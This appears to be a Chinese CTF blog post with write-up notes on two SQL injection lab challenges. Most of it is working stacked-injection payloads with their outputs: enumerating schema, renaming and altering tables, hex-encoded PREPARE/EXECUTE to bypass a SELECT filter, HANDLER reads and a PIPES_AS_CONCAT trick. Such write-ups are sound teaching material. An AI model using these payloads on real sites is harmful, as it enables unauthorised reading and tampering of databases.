---
title: 记录一下近期刷Buuoj学到的一点做题技巧
date: 2022-09-21 17:51:00
updated: 2022-09-21 20:45:00
tags: [ctf, security]
description: 一些笔记
---

## 强网杯2019_随便注

这是一道考堆叠注入的题目。

```python
1' order by 2 # 
```

用order by可以测出返回的字段数量为2

但是发现题目过滤了union和select
![图 1](https://s2.loli.net/2022/09/21/3HqpYwIAMWO2xv6.png)  

那么这里可以用堆叠注入，用`;`注入多条语句，用show来查询库名表名列名。

```
?inject=1';show databases;%23

array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```

```
?inject=1';show tables;%23

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

```
?inject=1';show columns from `1919810931114514`;%23

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

发现flag，但是没法直接查出flag字段的值。

### 思路一

根据对表结构的观察，我们直接输入的变量会从words表中根据id查出对应的值，那么这里可以想办法让flag从`1919810931114514`这个表到words表下，从而查出flag。

不过flag所在的表`1919810931114514`是没有id这个列的，所以我们先将words表rename成其他表，再将`1919810931114514`表改名为words并且添加列名id,再将flag这个列名改为data。

alter
作用：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）

用法：
```
添加一个列
alter table " table_name" add " column_name"  type;

删除一个列
alter table " table_name" drop " column_name"  type;

改变列的数据类型
alter table " table_name" alter column " column_name" type;

改列名
alter table " table_name" change " column1" " column2" type;

alter table "table_name" rename "column1" to "column2";
```

```
1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);%23

array(2) {
  [0]=>
  string(42) "flag{1957d8cb-e9c3-43a2-8535-baf3a012a9ba}"
  [1]=>
  string(1) "1"
}
```

### 思路二

用16进制编码绕过select的过滤查询flag字段的值。

将select * from ` 1919810931114514 `进行16进制编码，再通过构造payload得

```
1'SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;%23
```

理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。

### 思路三

用handler替换select来进行查询。

mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。

```
HANDLER tbl_name OPEN [ [AS] alias]
 
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]
 
HANDLER tbl_name CLOSE
```

```
?inject=1'; handler `1919810931114514` open as `a`; handler `a` read next;%23

array(1) {
  [0]=>
  string(42) "flag{3d656713-cae4-496d-a8fc-e197d81e8661}"
}
```

## SUSCTF2019_EasySQL

> 参考文章<https://www.cnblogs.com/gtx690/p/13176458.html>

首先也是先用字典`<https://github.com/TheKingOfDuck/fuzzDicts/blob/master/sqlDict/sql.txt`>fuzz一下过滤情况，然后发现报错注入和盲注一些常见的函数都被过滤了，这里可以考虑用堆叠注入，并且select并没有被过滤。

```
1;show databases;

1;show tables;

1;show columns from Flag;
```

诶但是flag被过滤了，因此这里不能看Flag的表结构了。

### 思路一

这是官方的wp中的思路，这里的sql语句为`select $post['query']||flag from Flag`。

```
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

其中set sql_mode=PIPES_AS_CONCAT;的作用是将||的功能从 或运算（or） 改为  字符串拼接，从而将select1和select flag from Flag的结果拼接在一起。

### 思路二

如果$post[‘query’]的数据为*,1，sql语句就变成了select*,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容

但是这里两种思路都是需要能够猜到查询语句的，所以感觉还是比较难的题目，做的时候很难想到。

